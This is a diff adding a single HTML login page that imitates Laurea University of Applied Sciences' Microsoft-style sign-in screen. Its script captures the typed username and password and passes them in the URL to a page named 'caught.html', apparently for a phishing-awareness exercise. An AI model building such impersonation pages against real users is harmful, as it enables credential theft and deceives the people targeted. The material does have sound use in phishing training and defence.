@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign In</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: "Segoe UI", Arial, sans-serif;
+      font-size: 14px;
+      display: flex;
+      height: 100vh;
+      overflow: hidden;
+    }
+
+    /* Left panel — dark green patterned background */
+    .bg-panel {
+      flex: 1;
+      background-color: #1a3d22;
+      background-image: repeating-linear-gradient(
+        45deg,
+        transparent,
+        transparent 60px,
+        rgba(255,255,255,0.03) 60px,
+        rgba(255,255,255,0.03) 62px
+      );
+      position: relative;
+      overflow: hidden;
+    }
+
+    /* Tiled Laurea watermark text */
+    .bg-panel::before {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='160' height='100'%3E%3Ctext x='10' y='60' font-family='Arial Black,Arial' font-weight='900' font-size='42' fill='rgba(255,255,255,0.07)' transform='rotate(-10 80 50)'%3ELAUREA%3C/text%3E%3C/svg%3E");
+      background-repeat: repeat;
+      background-size: 160px 100px;
+    }
+
+    /* Right panel — white login card */
+    .login-panel {
+      width: 360px;
+      min-width: 320px;
+      background: #fff;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      padding: 40px 36px 20px;
+      box-shadow: -4px 0 20px rgba(0,0,0,0.15);
+    }
+
+    .login-content { flex: 1; }
+
+    /* Logo */
+    .logo {
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      margin-bottom: 48px;
+    }
+
+    .logo-wordmark {
+      font-size: 28px;
+      font-weight: 900;
+      line-height: 1.1;
+      color: #1a1a1a;
+      letter-spacing: 0.5px;
+    }
+
+    .logo-divider {
+      width: 2px;
+      height: 44px;
+      background: #333;
+      margin: 0 2px;
+      align-self: center;
+    }
+
+    .logo-tagline {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      font-size: 11px;
+      font-weight: 600;
+      line-height: 1.4;
+      color: #333;
+      letter-spacing: 0.3px;
+      align-self: center;
+    }
+
+    /* Form */
+    h1 {
+      font-size: 18px;
+      font-weight: 400;
+      margin-bottom: 24px;
+      color: #1a1a1a;
+    }
+
+    .form-group {
+      margin-bottom: 12px;
+    }
+
+    input[type="email"],
+    input[type="password"],
+    input[type="text"] {
+      width: 100%;
+      padding: 10px 12px;
+      border: 1px solid #aaa;
+      border-radius: 0;
+      font-size: 14px;
+      font-family: inherit;
+      color: #1a1a1a;
+      outline: none;
+      background: #fff;
+    }
+
+    input[type="email"]:focus,
+    input[type="password"]:focus,
+    input[type="text"]:focus {
+      border-color: #1a3d22;
+      box-shadow: 0 0 0 1px #1a3d22;
+    }
+
+    input::placeholder { color: #999; }
+
+    .btn-signin {
+      margin-top: 20px;
+      padding: 10px 24px;
+      background: #1a3d22;
+      color: #fff;
+      font-size: 14px;
+      font-family: inherit;
+      border: none;
+      cursor: pointer;
+      font-weight: 500;
+    }
+
+    .btn-signin:hover { background: #122c18; }
+
+    .login-footer {
+      font-size: 11px;
+      color: #aaa;
+      text-align: left;
+      padding-top: 20px;
+      border-top: 1px solid #eee;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="bg-panel"></div>
+
+  <div class="login-panel">
+    <div class="login-content">
+
+      <div class="logo">
+        <div class="logo-wordmark">LAU<br>REA</div>
+        <div class="logo-divider"></div>
+        <div class="logo-tagline">
+          <span>AMMATTIKORKEAKOULU</span>
+          <span>University of Applied Sciences</span>
+        </div>
+      </div>
+
+      <h1>Sign in</h1>
+
+      <form id="loginForm" onsubmit="handleSubmit(event)">
+        <div class="form-group">
+          <input type="text" id="username" name="username"
+                 placeholder="someone@example.com" autocomplete="username" required>
+        </div>
+        <div class="form-group">
+          <input type="password" id="password" name="password"
+                 placeholder="Password" autocomplete="current-password" required>
+        </div>
+        <button type="submit" class="btn-signin">Sign in</button>
+      </form>
+
+    </div>
+    <div class="login-footer">© 2018 Microsoft</div>
+  </div>
+
+  <script>
+    function handleSubmit(e) {
+      e.preventDefault();
+      const u = document.getElementById('username').value;
+      const p = document.getElementById('password').value;
+      const params = new URLSearchParams({ u, p });
+      window.location.href = 'caught.html?' + params.toString();
+    }
+  </script>
+
+</body>
+</html>
